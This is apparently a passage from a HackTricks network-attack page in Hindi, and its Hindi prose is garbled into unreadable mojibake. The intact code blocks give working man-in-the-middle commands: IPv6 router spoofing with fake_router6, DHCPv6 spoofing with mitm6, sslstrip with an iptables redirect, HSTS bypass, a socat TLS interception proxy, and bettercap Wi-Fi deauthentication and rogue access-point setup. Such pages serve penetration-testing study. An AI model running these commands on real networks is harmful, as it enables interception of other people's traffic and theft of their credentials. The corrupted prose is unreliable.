рдХреБрдЫ рдУрдПрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП рдЖрд░рдП рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдЧреЗрдЯрд╡реЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЖрдИрдкреАрд╡реА6 рд░рд╛рдЙрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```

### IPv6 DHCP spoofing

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдУрдПрд╕ DHCPv6 рдкреИрдХреЗрдЯ рдХреЛ рдкрдврд╝рдХрд░ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ DHCPv6 рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЦреБрдж рдХреЛ DNS рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗред DHCP рднреА рдкреАрдбрд╝рд┐рдд рдХреЛ рдПрдХ IPv6 рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```

### HTTP (рдлреЗрдХ рдкреЗрдЬ рдФрд░ JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

## рдЗрдВрдЯрд░рдиреЗрдЯ рд╣рдорд▓реЗ

### sslStrip

рдпрд╣ рд╣рдорд▓рд╛ рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ рдпрд╣ рдХрд░рддрд╛ рд╣реИ, рдЬрдм **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **HTTP** рдкреЗрдЬ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА **рдХреЛрд╢рд┐рд╢** рдХрд░рддрд╛ рд╣реИ рдЬреЛ **HTTPS** рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реЛ рд░рд╣рд╛ рд╣реИред **sslStrip** рдПрдХ **HTTP рдХрдиреЗрдХреНрд╢рди рдХреЛ** **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдФрд░** рдПрдХ **HTTPS рдХрдиреЗрдХреНрд╢рди рдХреЛ** **рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛** рддрд╛рдХрд┐ рдпрд╣ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рд╕рд╛рджрд╛ рдкрд╛рда** рдореЗрдВ **рд╕реНрдирд┐рдл** рдХрд░ рд╕рдХреЗред

```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf) рдорд┐рд▓реЗрдЧреАред

### sslStrip+ рдФрд░ dns2proxy HSTS рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

**sslStrip+ рдФрд░ dns2proxy** рдФрд░ **sslStrip** рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**www.facebook.com**_ рдХреЛ _**wwww.facebook.com**_ (рдзреНрдпрд╛рди рджреЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд "**w**") рдореЗрдВ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЗрд╕ рдбреЛрдореЗрди рдХрд╛ рдкрддрд╛ рдЕрдЯреИрдХрд░ рдЖрдИрдкреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рддрд░рд╣, **рдЧреНрд░рд╛рд╣рдХ** _**wwww.facebook.com**_ (рдЖрдХреНрд░рдордХ) рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдкреАрдЫреЗ рдХреЗ рд╕реНрдХреАрди рдореЗрдВ **sslstrip+** рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХрдиреЗрдХреНрд╢рди рдХреЛ https рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **www.facebook.com** рдХреЗ рд╕рд╛рде **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛**ред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рд▓рдХреНрд╖реНрдп HSTS рдХреЛ рдЯрд╛рд▓рдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _**wwww**.facebook.com_ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ **рдлреЗрд╕рдмреБрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг HTTP рдореЗрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рдкрд╣рд▓реЗ [http://www.faceook.com](http://www.faceook.com) рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реЛрдЧреА рдФрд░ https рдирд╣реАрдВред рдЗрд╕реЗ рдПрдХ http рдкреГрд╖реНрда рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдВрдХреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.bettercap.org/legacy/#hsts-bypass), [рдпрд╣рд╛рдБ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) рдФрд░ [рдпрд╣рд╛рдБ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly) рдорд┐рд▓реЗрдЧреАред

**sslStrip рдпрд╛ sslStrip+ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА HSTS рдирд┐рдпрдо рд╕рд╣реЗрдЬреЗ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "рдорд╣рддреНрд╡рдкреВрд░реНрдг" рдбреЛрдореЗрди рддрдХ рдкрд╣рд▓реА рдмрд╛рд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕реЗ HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рд╣реЗрдЬреЗ рдЧрдП рдирд┐рдпрдо рдФрд░ рдЕрдиреНрдп рдЙрддреНрдкрдиреНрди рдирд┐рдпрдо рдЭрдВрдбрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**`includeSubdomains`**](https://hstspreload.appspot.com) **рддрд╛рдХрд┐ рдкрд╣рд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ \_**wwww.facebook.com**\_ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ \_**facebook.com**\_ `includeSubdomains` рдХреЗ рд╕рд╛рде HSTS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред**

рдХрд╛рд░реНрдп: easy-creds, evilgrade, metasploit, factory

## рдкреЛрд░реНрдЯ рдореЗрдВ TCP рд╕реБрдиреЗрдВ

```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```

## TCP + SSL рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрдирдирд╛

#### рдХреБрдВрдЬреА рдФрд░ рдЖрддреНрдо-рд╕рд╛рдЗрди рдХреА рдЧрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ

```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```

#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдВ

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

рдХрднреА-рдХрднреА, рдЕрдЧрд░ рдЧреНрд░рд╛рд╣рдХ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕реАрдП рдПрдХ рд╡реИрдз рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╕реАрдП рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкрд░реАрдХреНрд╖рдг, рдЕрдиреБрд░реЛрдзрд┐рдд рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рд╕реНрд╡-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред

рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдПрдХ рд╡реИрдз рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЬреЛ рдПрдХ рд╡реИрдз рд╕реАрдП рдирд╣реАрдВ рд╣реИред рдпрд╛ рд╡реИрдз рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рдПрдХ рдРрд╕реЗ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреИрд╕реЗ рдбрд┐рдлреА рд╣реЗрд▓рдореИрди (рдЬрд┐рд╕рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЬрдм рдЧреНрд░рд╛рд╣рдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдПрдХ рдкреНрд░реЛрдм (рдЬреИрд╕реЗ рдПрдХ рд╣реИрд╢) рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирдХрд▓реА рдкреНрд░реЛрдм рднреЗрдЬреЗрдВ рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рдЧреНрд░рд╛рд╣рдХ рдЗрд╕реЗ рдирд╣реАрдВ рдЬрд╛рдВрдЪрддрд╛ред

## Bettercap

```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```

### рд╕рдХреНрд░рд┐рдп рдЦреЛрдЬ рдиреЛрдЯреНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдПрдХ UDP рдкреИрдХреЗрдЯ рдПрдХ рдЙрдкрдХрд░рдг рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ ICMP (рдкреЛрд░реНрдЯ рдЕрдкреНрд░рд╛рдкреНрдд) рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **ARP рдЦреЛрдЬ**

ARP рдкреИрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдХреМрди рд╕реЗ IPs рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдЙрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред PC рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреЗрд╡рд▓ рдЙрдирдореЗрдВ рд╕реЗ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ, рд╡рд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдВрдЧреЗред

### **mDNS (рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS)**

Bettercap рдПрдХ MDNS рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ X рдорд┐рд▓реАрд╕реЗрдХрдВрдб рдореЗрдВ) **\_services\_.dns-sd.\_udp.local** рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕ рдкреИрдХреЗрдЯ рдХреЛ рджреЗрдЦрдиреЗ рд╡рд╛рд▓рд╛ рдорд╢реАрди рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддрд╛ рд╣реИред рдлрд┐рд░, рдпрд╣ рдХреЗрд╡рд▓ "рд╕реЗрд╡рд╛рдУрдВ" рдХреЗ рд▓рд┐рдП рдЙрддреНрддрд░ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдорд╢реАрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИред

**рдЙрдкрдХрд░рдг**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios рдирд╛рдо рд╕рд░реНрд╡рд░)**

Bettercap рдирд╛рдо "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯ 137/UDP рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред

### **SSDP (рд╕рд┐рдореНрдкрд▓ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)**

Bettercap SSDP рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣рд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 1900)ред

### **WSD (рд╡реЗрдм рд╕реЗрд╡рд╛ рдЦреЛрдЬ)**

Bettercap WSD рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд░рд╣рд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 3702)ред

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди: рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдиреЗрдВ (рддреАрд╕рд░рд╛ рд╕рдВрд╕реНрдХрд░рдг)**
* **рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рдЖрдИрдУрдЯреА рд╣реИрдХрд┐рдВрдЧ: рдЗрдВрдЯрд░рдиреЗрдЯ рдСрдлрд╝ рдерд┐рдВрдЧреНрд╕ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдлреЛрдЯрд┐рдпреЛрд╕ рдЪрдВрдЯреНрдЬрд┐рд╕, рдЗрдУрдЖрдиреНрдирд┐рд╕ рд╕реНрдЯреЗрд╕, рдкреЙрд▓рд┐рдиреЛ рдХрд╛рд▓реНрдбреЗрд░реЛрди, рдПрд╡реЗрдВрдЬреЗрд▓реЛрд╕ рдбреАрд░реНрдореЗрдВрдЯреНрдЬреЛрдЧреНрд▓реВ, рдмреНрдпреВ рд╡реБрдб**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ **Intigriti** рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рдЬреЛ рддрдХрд░реАрдмрди **$100,000** рддрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ HackTricks рдореЗрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ рдлреЙрд▓реЛ\*\* рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
